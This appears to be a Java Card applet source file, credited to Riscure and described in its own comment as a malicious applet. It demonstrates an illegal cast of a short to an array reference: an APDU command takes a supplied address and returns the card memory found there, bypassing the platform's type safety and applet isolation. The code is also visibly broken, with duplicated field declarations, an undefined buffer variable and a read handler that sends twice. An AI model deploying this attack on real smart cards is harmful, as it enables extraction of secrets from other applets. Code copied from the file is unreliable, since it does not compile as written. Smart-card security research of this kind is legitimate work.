package com.illegalcast;

// import javacard.framework.*;

// public class IllegalCastOfShortToRef extends Applet {

//     public static void install(byte[] array, short off, byte len) {
//         new IllegalCastOfShortToRef().register();
//     }
//     public void process(APDU apdu) {
//         if (selectingApplet()) { return; }

//         byte[] buf = apdu.getBuffer();
//         switch (buf[ISO7816.OFFSET_INS]) {
//             default:
//                 ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
//         }
//     }

// }

/*
 * Copyright 2016 Riscure
 */
// package com.short_to_ref;

import javacard.framework.*;
import javacard.security.*;

/**
 * Malicious applet demonstrating illegal cast of a short to a byte array pointer
 *
 * @author Sergei Volokitin
 * @aid 0xA0:0x00:0x00:0x00:0xAA:0x44:0x01
 * @version 1.0
 */
public class ShortToRef extends Applet {
  // Constants

  private static final byte INS_SUCCESS = 0x01;
  private static final byte INS_FAILURE = 0x02;

  byte[] success = {(byte) 0x01, (byte) 0x02, (byte) 0x01, (byte) 0x02};
  byte[] failure = {(byte) 0x80, (byte) 0x40, (byte) 0x80, (byte) 0x40};
  short msgLen = 4;

  protected static final byte CLA_APP = (byte) 0xA0; // CLASS byte for regular APDUs
  protected static final byte INS_READ = (byte) 0xB0; // INS byte to read arbitrary reference

  byte[] failure = {(byte) 0x80, (byte) 0x40, (byte) 0x80, (byte) 0x40};
  short msgLen = 4;

  public static void install(byte[] bArray, short bOffset, byte bLength) {
    new ShortToRef(bArray, bOffset, bLength);
  }

  protected ShortToRef(byte[] bArray, short bOffset, byte bLength) {
    register();
  }

  public void process(APDU apdu) {
    short offset, length;
    byte[] ba;
    byte[] buffer = apdu.getBuffer(); // get the input buffer
    if (selectingApplet()) return; // don’t process the SELECT APDU
    if (buffer[ISO7816.OFFSET_CLA] != CLA_APP) // reject APDUs with wrong CLASS byte
    ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
    switch (buffer[ISO7816.OFFSET_INS]) {
      case INS_READ: // read from arbitrary memory position −− 0xB0
        offset = Util.getShort(buffer, ISO7816.OFFSET_P1);
        length = (short) (buffer[ISO7816.OFFSET_LC] & 0xFF);
        ba = ptr(offset);
        if (ba != null) {
          if ((short) ba.length < 0x80) length = (short) ba.length;
          Util.arrayCopy(ba, (short) 0, buffer, (short) 0, length);
          apdu.setOutgoingAndSend((short) 0, length);
        }
        Util.arrayCopyNonAtomic(failure, (short) 0, buffer, (short) 0, msgLen);
        apdu.setOutgoingAndSend((short) 0, (short) 4);
        break;
      case INS_SUCCESS:
        Util.arrayCopyNonAtomic(success, (short) 0, buf, (short) 0, msgLen);
        apdu.setOutgoingAndSend((short) 0, (short) 4);
        break;
      case INS_FAILURE:
        Util.arrayCopyNonAtomic(failure, (short) 0, buf, (short) 0, msgLen);
        apdu.setOutgoingAndSend((short) 0, (short) 4);
        break;

      default:
        ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
    }
  }

  // Ill−typed function performing illegal cast of a short value to a byte pointer
  public static byte[] ptr(short addr) {
    return null; // dummy statement to be replaced after compilation
  }

  public static short[] ptrHelper(short[] addr) {
    return addr;
  }
}
